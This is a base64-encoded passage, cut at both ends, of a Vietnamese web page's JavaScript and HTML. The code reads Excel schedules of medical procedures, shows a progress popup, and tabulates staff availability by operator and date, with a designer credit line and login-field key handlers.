WRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1wYXBlci1wbGFuZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJBhbmcgZ+G7rWkgZOG7ryBsaeG7h3UgduG7gSBtw6F5IGNo4bunLi4uJzsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICczMyUnOw0KCQ0KCQ0KCQ0KCWNvbnN0IHByb2dyZXNzQmFyQ29udGFpbmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyQ29udGFpbmVyJyk7DQoNCi8vIENo4buJIHThuqFvIDEgbOG6p24NCmlmICghZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NyZWRpdExpbmVCZWxvdycpKSB7DQogIGNvbnN0IGNyZWRpdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBjcmVkaXQuaWQgPSAnY3JlZGl0TGluZUJlbG93JzsNCiAgY3JlZGl0LmlubmVyVGV4dCA9ICfCqSBUaGnhur90IGvhur8gJiBwaMOhdCB0cmnhu4NuIGLhu59pIENow6J1IEh14buzbmgnOw0KICBjcmVkaXQuc3R5bGUubWFyZ2luVG9wID0gJzEwcHgnOw0KICBjcmVkaXQuc3R5bGUuZm9udFNpemUgPSAnMTZweCc7DQogIGNyZWRpdC5zdHlsZS5jb2xvciA9ICcjRkYwMDAwJzsNCiAgY3JlZGl0LnN0eWxlLnRleHRBbGlnbiA9ICdjZW50ZXInOw0KDQogIHByb2dyZXNzQmFyQ29udGFpbmVyLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGNyZWRpdCwgcHJvZ3Jlc3NCYXJDb250YWluZXIubmV4dFNpYmxpbmcpOw0KfQ0KCQ0KCQ0KCQ0KCQ0KICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNTApKSk7DQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDcwMCkpOw0KDQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnNjYlJzsNCg0KICAgIGxldCB0b3RhbCA9IDA7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgZmlsZVJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7DQogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7DQogICAgICAgICAgICBmaWxlUmVhZGVyLm9ubG9hZCA9IGUgPT4gcmVzb2x2ZShuZXcgVWludDhBcnJheShlLnRhcmdldC5yZXN1bHQpKTsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIub25lcnJvciA9ICgpID0+IHJlamVjdChuZXcgRXJyb3IoIkzhu5dpIMSR4buNYyBmaWxlIikpOw0KICAgICAgICAgICAgZmlsZVJlYWRlci5yZWFkQXNBcnJheUJ1ZmZlcihmaWxlKTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KICAgICAgICBjb25zdCBmaXJzdFNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihmaXJzdFNoZWV0LCB7DQogICAgICAgICAgICBoZWFkZXI6IDEsDQogICAgICAgICAgICBkZWZ2YWw6ICIiLA0KICAgICAgICAgICAgYmxhbmtyb3dzOiB0cnVlDQogICAgICAgIH0pOw0KDQogICAgICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICAgICAgdG90YWwgPSByb3dzLmxlbmd0aDsNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdG90YWwgPSAxMDAwOw0KICAgIH0NCg0KICAgIGNvbnN0IHN0ZXAgPSAxMDA7DQogICAgY29uc3Qgc3RlcHMgPSBNYXRoLmNlaWwodG90YWwgLyBzdGVwKTsNCiAgICBjb25zdCBpbnRlcnZhbCA9IDI2MDAgLyBzdGVwczsNCg0KICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IHN0ZXBzOyBpKyspIHsNCiAgICAgICAgY29uc3QgY3VycmVudCA9IE1hdGgubWluKGkgKiBzdGVwLCB0b3RhbCk7DQogICAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojMjk4MGI5O21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQYW5nIHBow6JuIHTDrWNoIGThu68gbGnhu4d1IHThu6tuZyBi4buHbmggbmjDom4uLi48YnI+JyArIGN1cnJlbnQgKyAnIC8gJyArIHRvdGFsOw0KICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgaW50ZXJ2YWwpKTsNCiAgICB9DQoNCiAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1jaGVjay1jaXJjbGUiIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpncmVlbjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkMOjIGtp4buDbSB0cmEgeG9uZy4uLic7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMTAwJSc7DQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDEwMDApKTsNCg0KaWYgKCF3aW5kb3cuaXNLaG9hTG9pKSB7DQogICAgcG9wdXAuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOw0KICAgIHNldFRpbWVvdXQoKCkgPT4geyBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9LCA1MDApOw0KDQoNCn0NCg0KDQoNCiBlbHNlIHsNCiAgICAvLyBO4bq/dSDEkWFuZyBs4buXaSBLaG9hLCBLSMOUTkcgxJHGsOG7o2Mg4bqpbiBwb3B1cA0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KfQ0KICAgIGhhbmRsZUZpbGUoKTsNCgkNCgkNCgkNCgkNCnNldFRpbWVvdXQoKCkgPT4gew0KICAgIC8vIOKdjCBO4bq/dSDEkWFuZyBs4buXaSB0w6puIGtob2EgdGjDrCBnaeG7ryBuZ3V5w6puIHBvcHVwLCBLSMOUTkcgxJHGsOG7o2Mg4bqpbiwgS0jDlE5HIGhp4buHbiBuw7p0DQogICAgaWYgKHdpbmRvdy5pc0tob2FMb2kpIHsNCiAgICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICAgICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8g4pyFIE7hur91IGtow7RuZyBs4buXaSwgdGjDrCDhuqluIHBvcHVwIHbDoCBoaeG7h24gbsO6dCBjaOG7qWMgbsSDbmcNCiAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCg0KICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbi5idG4nKS5mb3JFYWNoKGJ0biA9PiB7DQogICAgICAgIGlmIChidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ0dp4budIHRy4buRbmcnKSB8fCBidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSkgew0KICAgICAgICAgICAgYnRuLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgICAgICAgfQ0KICAgIH0pOw0KfSwgNTAwKTsNCg0KDQoJDQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBkcm9wZG93biBs4buNYw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyQnlPcGVyYXRvcik7DQogICAgICAgICAgICANCgkJCQ0KCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlckJ5T3BlcmF0b3IpOw0KCQkJDQoJCQkNCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIHJhZGlvIGJ1dHRvbiBjaOG7jW4ga2h1bmcgZ2nhu50NCiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXScpLmZvckVhY2gocmFkaW8gPT4gew0KICAgICAgICAgICAgICAgIHJhZGlvLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfSk7DQoJCQkNCgkJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCn0pOw0KDQogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAvLyBjaOG7iSByZW5kZXIgbOG6oWksIEtIw5RORyDEkeG7pW5nIGRyb3Bkb3duIGLDqm4ga2lhDQogICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogfSk7DQoJCQkNCiAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJwcm9jZWR1cmUtaW5mbyI+PGNlbnRlcj4gDQpEZXNpZ24gQnkgPGEgaHJlZj0iaHR0cDovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiB0YXJnZXQ9Il9ibGFuayI+IERyLkNow6J1PC9hPjxici8+DQogICAgICAgICAgICAgICAgTuG6v3UgQ8OzIELhuqV0IEvhu7MgVsaw4bubbmcgTeG6r2MgR8OsIFZ1aSBMw7JuZyBMSCA6IDxici8+DQogICAgICAgICAgICAgICAgRW1haWw6IGNoYXVodXluaDAxMDRAZ21haWwuY29tPGJyLz4NCiAgICAgICAgICAgICAgICBTRFQ6IDA3OS41NjcuOTM1MDwvY2VudGVyPg0KPC9kaXY+DQo8c2NyaXB0Pg0KICAvLyBI4buXIHRy4bujIG5o4bqlbiBFbnRlciB04burIMO0IHVzZXJuYW1lIGhv4bq3YyBwYXNzd29yZA0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmZvY3VzKCk7DQogICAgfQ0KICB9KTsNCg0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAnRW50ZXInKSB7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5jbGljaygpOw0KICAgIH0NCiAgfSk7DQoNCi8vID09PT09PSBU4buwIMSQ4buYTkcgUVXDiVQgVEjGryBN4bukQyAmIENI4buMTiBGSUxFIE3hu5pJIE5I4bqkVCA9PT09PT0NCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlckJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmb2xkZXJJbnB1dCcpLmNsaWNrKCk7DQp9KTsNCg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlcklucHV0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgYXN5bmMgKGUpID0+IHsNCiBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggdHLGsOG7m2Mga2hpIMSR4buNYyB3b3JrYm9vaw0KICAgIGNvbnN0IGZpbGVzID0gQXJyYXkuZnJvbShlLnRhcmdldC5maWxlcykuZmlsdGVyKGYgPT4gL1wuKHhsc3h8eGxzfGNzdikkL2kudGVzdChmLm5hbWUpKTsNCiAgICBjb25zdCBzdGF0dXNEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCg0KICAgIGlmIChmaWxlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJ3JlZCc7DQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSAnS2jDtG5nIHTDrG0gdGjhuqV5IGZpbGUgRXhjZWwgaOG7o3AgbOG7hyB0cm9uZyB0aMawIG3hu6VjLic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgdmFsaWRGaWxlID0gbnVsbDsNCg0KICAgIGZvciAoY29uc3QgZmlsZSBvZiBmaWxlcy5zb3J0KChhLCBiKSA9PiBiLmxhc3RNb2RpZmllZCAtIGEubGFzdE1vZGlmaWVkKSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IGZpbGUuYXJyYXlCdWZmZXIoKTsNCiAgICAgICAgICAgIGNvbnN0IHdvcmtib29rID0gWExTWC5yZWFkKGRhdGEsIHsgdHlwZTogJ2FycmF5JyB9KTsNCg0KICAgICAgICAgICAgaWYgKCF3b3JrYm9vay5TaGVldE5hbWVzWzFdKSBjb250aW51ZTsgLy8gY+G6p24gU2hlZXQgdGjhu6kgMg0KDQogICAgICAgICAgICBjb25zdCBzaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKHNoZWV0LCB7IGhlYWRlcjogMSwgZGVmdmFsOiAiIiwgYmxhbmtyb3dzOiB0cnVlIH0pOw0KDQogICAgICAgICAgICBpZiAoanNvbkRhdGEubGVuZ3RoID49IDEwKSB7IC8vIMOtdCBuaOG6pXQgMiBkw7JuZyBoZWFkZXIgdsOgIGPDsyBk4buvIGxp4buHdSBkw7JuZyAxMA0KICAgICAgICAgICAgICAgIHZhbGlkRmlsZSA9IGZpbGU7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgxJHhu41jIGZpbGUgJHtmaWxlLm5hbWV9OmAsIGVycik7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAodmFsaWRGaWxlKSB7DQogICAgICAgIGNvbnN0IGR0ID0gbmV3IERhdGFUcmFuc2ZlcigpOw0KICAgICAgICBkdC5pdGVtcy5hZGQodmFsaWRGaWxlKTsNCiAgICAgICAgZmlsZUlucHV0LmZpbGVzID0gZHQuZmlsZXM7DQoNCiAgICAgICAgLy8gY+G6rXAgbmjhuq10IHRy4bqhbmcgdGjDoWkNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9IGA8aSBjbGFzcz0iZmFzIGZhLWZvbGRlci1vcGVuIj48L2k+IMSQw6MgY2jhu41uIGZpbGU6IDxiPiR7dmFsaWRGaWxlLm5hbWV9PC9iPmA7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJyMyYzNlNTAnOw0KDQogICAgICAgIC8vIEfhu41pIGtp4buDbSB0cmENCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKS5jbGljaygpOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHN0YXR1c0Rpdi5zdHlsZS5jb2xvciA9ICdyZWQnOw0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gJ0tow7RuZyB0w6xtIMSRxrDhu6NjIGZpbGUgY8OzIGPhuqV1IHRyw7pjIGjhu6NwIGzhu4cuIFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpLic7DQogICAgfQ0KfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ0b2FzdCIgaWQ9InRvYXN0Ij48L2Rpdj4NCjwhLS0gUG9wdXAgbG9hZGluZyAtLT4NCjxkaXYgaWQ9ImxvYWRpbmdQb3B1cCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KTt6LWluZGV4Ojk5OTk7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7Zm9udC1mYW1pbHk6J0ludGVyJyxzYW5zLXNlcmlmIj4NCjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6I2ZmZjtwYWRkaW5nOjMwcHggNDBweDtib3JkZXItcmFkaXVzOjEwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Ym94LXNoYWRvdzowIDAgMTVweCByZ2JhKDAsMCwwLDAuMyk7bWF4LXdpZHRoOjkwJTtmb250LXNpemU6MThweCI+DQo8ZGl2IGlkPSJsb2FkaW5nVGV4dCI+DQo8aSBjbGFzcz0iZmFzIGZhLXNwaW5uZXIgZmEtc3BpbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMzNDk4ZGI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICDEkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4NCiAgICA8L2Rpdj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyQ29udGFpbmVyIj4NCjxkaXYgaWQ9InByb2dyZXNzQmFyIj48L2Rpdj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8aDI+VGjhu5FuZyBrw6ogZ2nhu50gdHLhu5FuZyB04burbmcgbmfGsOG7nWk8L2gyPg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICA8dGhlYWQ+DQogICAgICA8dHI+DQogICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgDQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBzw6FuZzwvdGg+DQogICAgICAgIDx0aD5HaeG7nSB0cuG7kW5nIGJ14buVaSBjaGnhu4F1PC90aD4NCiAgICAgIDwvdHI+DQogICAgPC90aGVhZD4NCiAgICA8dGJvZHkgaWQ9ImF2YWlsYWJpbGl0eUJvZHkiPjwvdGJvZHk+DQogIDwvdGFibGU+DQo8L2Rpdj4NCjwhLS0gS+G6vlQgVEjDmkM6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uKCkgew0KICBjb25zdCBub2lkdW5nID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm5vaWR1bmciKTsNCiAgY29uc3QgbGlzdDEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIubGlzdDEiKTsNCg0KICBpZiAobm9pZHVuZyAmJiBsaXN0MSkgew0KICAgIGNvbnN0IHRleHQgPSBub2lkdW5nLnRleHRDb250ZW50IHx8IG5vaWR1bmcuaW5uZXJUZXh0IHx8ICIiOw0KICAgIGlmICh0ZXh0LnRyaW0oKSA9PT0gIiIpIHsNCiAgICAgIGxpc3QxLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KLy8gPT09PSBUw41OSCBUT8OBTiBHSeG7nCBUUuG7kE5HIENITyBU4buqTkcgTkfGr+G7nEkgPT09PQ0KDQoNCg0KZnVuY3Rpb24gdG9nZ2xlQXZhaWxhYmlsaXR5KCkgew0KICAgIGNvbnN0IHRhYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2F2YWlsYWJpbGl0eVRhYmxlJyk7DQogICAgY29uc3QgZmlsdGVyQmxvY2sgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXZhaWxhYmlsaXR5RmlsdGVyQmxvY2snKTsNCiAgICBpZiAodGFibGUuc3R5bGUuZGlzcGxheSA9PT0gJ25vbmUnKSB7DQogICAgICAgIHRhYmxlLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBjYWxjdWxhdGVBdmFpbGFiaWxpdHkoKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICB0YWJsZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBpZiAoZmlsdGVyQmxvY2spIGZpbHRlckJsb2NrLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSgpIHsNCiAgICBjb25zdCBncm91cHMgPSB7fTsNCiAgICBhbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IGtleSA9IGAke3Byb2Mub3BlcmF0b3J9XyR7cHJvYy5kYXRlfWA7DQogICAgICAgIGlmICghZ3JvdXBzW2tleV0pIGdyb3Vwc1trZXldID0gW107DQogICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQoNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdmFpbGFiaWxpdHlCb2R5Jyk7DQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQoNCiAgICBjb25zdCBzZWxlY3RlZE9wID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlck9wZXJhdG9yJyk/LnZhbHVlIHx8ICdhbGwnOw0KICAgIGNvbnN0IHNlbGVjdGVkRGF0ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk/LnZhbHVlIHx8ICdhbGwnOw0KDQogICAgLy8gQ2jhu4kga2jhu59pIHThuqFvIGRyb3Bkb3duIDEgbOG6p24NCiAgICBpZiAoIWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpLmRhdGFzZXQuaW5pdGlhbGl6ZWQpIHsNCiAgICAgICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQoYWxsUHJvY2VkdXJlcy5tYXAocCA9PiBwLm9wZXJhdG9yKSldLnNvcnQoKTsNCiAgICAgICAgY29uc3QgZGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCBvcFNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJPcGVyYXRvcicpOw0KICAgICAgICBjb25zdCBkYXRlU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbHRlckRhdGUnKTsNCg0KICAgICAgICBvcFNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICAgICAgZGF0ZVNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgICAgICBkYXRlcy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KDQogICAgICAgIG9wU2VsZWN0LmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgICAgIGRhdGVTZWxlY3QuZGF0YXNldC5pbml0aWFsaXplZCA9ICd0cnVlJzsNCg0KICAgICAgICBvcFNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBjYWxjdWxhdGVBdmFpbGFiaWxpdHkpOw0KICAgICAgICBkYXRlU2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGNhbGN1bGF0ZUF2YWlsYWJpbGl0eSk7DQogICAgfQ0KDQogICAgT2JqZWN0LmtleXMoZ3JvdXBzKS5mb3JFYWNoKGtleSA9PiB7DQogICAgICAgIGNvbnN0IFtvcGVyYXRvciwgZGF0ZV0gPSBrZXkuc3BsaXQoJ18nKTsNCiAgICAgICAgaWYgKChzZWxlY3RlZE9wICE9PSAnYWxsJyAmJiBvcGVyYXRvciAhPT0gc2VsZWN0ZWRPcCkgfHwNCiAgICAgICAgICAgIChzZWxlY3RlZERhdGUgIT09ICdhbGwnICYmIGRhdGUgIT09IHNlbGVjdGVkRGF0ZSkpIHJldHVybjsNCg0KICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gZ3JvdXBzW2tleV07DQogICAgICAgIHByb2NlZHVyZXMuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KDQogICAgICAgIGNvbnN0IG1vcm5pbmdTdGFydCA9IDcgKiAzNjAwOw0KICAgICAgICBjb25zdCBtb3JuaW5nRW5kID0gMTEuNSAqIDM2MDA7DQogICAgICAgIGNvbnN0IGFmdGVybm9vblN0YXJ0ID0gMTMuNSAqIDM